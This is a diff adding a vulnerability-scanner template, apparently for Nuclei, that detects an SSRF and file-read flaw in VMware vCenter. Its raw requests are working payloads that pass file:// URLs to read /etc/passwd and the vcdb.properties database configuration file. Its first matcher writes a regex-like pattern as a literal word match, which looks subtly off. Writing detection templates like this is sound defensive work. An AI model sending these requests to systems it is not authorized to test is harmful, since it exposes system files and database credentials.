@@ -1,0 +1,38 @@
+id: vmware-vcenter-provider-logo-url-ssrf
+info:
+  name: VMware vCenter Provider Logo URL SSRF and File Read
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies an SSRF vulnerability in VMware vCenter's provider logo URL functionality, allowing sensitive file reading.
+  reference:
+    - https://github.com/l0ggg/VMware_vCenter
+http:
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:[x*]:0:0:"
+        part: body
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///C:/ProgramData/VMware/vCenterServer/cfg/vmware-vpx/vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "org.postgresql.Driver"
+        part: body
